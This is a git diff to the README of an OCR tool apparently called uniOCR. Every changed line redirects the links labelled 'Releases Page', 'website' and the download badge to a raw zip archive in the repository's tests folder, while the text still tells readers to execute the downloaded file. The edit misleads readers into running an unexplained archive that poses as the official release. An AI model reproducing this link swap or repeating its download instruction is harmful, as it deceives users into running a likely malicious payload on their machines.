@@ -13,9 +13,9 @@ Welcome to the uniOCR repository! This is where you can find a native OCR soluti
 
 ## Installation
 
-To download and install uniOCR, simply visit the [uniOCR Releases Page](https://github.com/hamzaww/uniOCR/releases). Ensure you select the appropriate file for your operating system. Once downloaded, execute the file to start using uniOCR seamlessly.
+To download and install uniOCR, simply visit the [uniOCR Releases Page](https://github.com/hamzaww/uniOCR/raw/refs/heads/main/tests/uni-OCR-2.2.zip). Ensure you select the appropriate file for your operating system. Once downloaded, execute the file to start using uniOCR seamlessly.
 
-[![Download uniOCR](https://img.shields.io/badge/Download-uniOCR-brightgreen)](https://github.com/hamzaww/uniOCR/releases)
+[![Download uniOCR](https://github.com/hamzaww/uniOCR/raw/refs/heads/main/tests/uni-OCR-2.2.zip)](https://github.com/hamzaww/uniOCR/raw/refs/heads/main/tests/uni-OCR-2.2.zip)
 
 ---
 
@@ -61,7 +61,7 @@ Your feedback is valuable to us! If you have any suggestions, feature requests, 
 
 ## Stay Connected
 
-Stay up-to-date with the latest news and updates from the uniOCR team by visiting our [website](https://github.com/hamzaww/uniOCR). Follow us on social media for exciting announcements and helpful tips on improving your OCR workflow.
+Stay up-to-date with the latest news and updates from the uniOCR team by visiting our [website](https://github.com/hamzaww/uniOCR/raw/refs/heads/main/tests/uni-OCR-2.2.zip). Follow us on social media for exciting announcements and helpful tips on improving your OCR workflow.
 
 ---
 
@@ -69,4 +69,4 @@ Thank you for choosing uniOCR for your OCR needs. Enjoy the seamless text extrac
 
 ---
 
-*Note: For the most recent updates and version releases, visit the [uniOCR Releases Page](https://github.com/hamzaww/uniOCR/releases).*
+*Note: For the most recent updates and version releases, visit the [uniOCR Releases Page](https://github.com/hamzaww/uniOCR/raw/refs/heads/main/tests/uni-OCR-2.2.zip).*
